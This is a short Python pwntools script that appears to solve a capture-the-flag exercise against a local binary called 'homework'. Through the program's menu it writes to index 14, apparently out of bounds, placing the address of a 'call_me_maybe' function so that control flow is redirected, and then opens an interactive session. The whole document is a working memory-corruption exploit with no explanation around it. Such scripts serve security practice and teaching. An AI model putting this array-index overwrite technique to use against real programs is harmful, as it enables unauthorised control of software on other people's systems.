from pwn import *
#context.log_level = 'debug'
io = process('./homework')
elf = ELF('./homework')

io.sendlineafter('name? ', 'XiaozaYa')
io.recvuntil('dump')
io.sendlineafter(' > ', '1')
io.sendlineafter('edit: ', '14')
io.sendlineafter('many? ', str(elf.symbols['call_me_maybe']))
io.recvuntil('dump')
io.sendlineafter(' > ', '0')

io.interactive()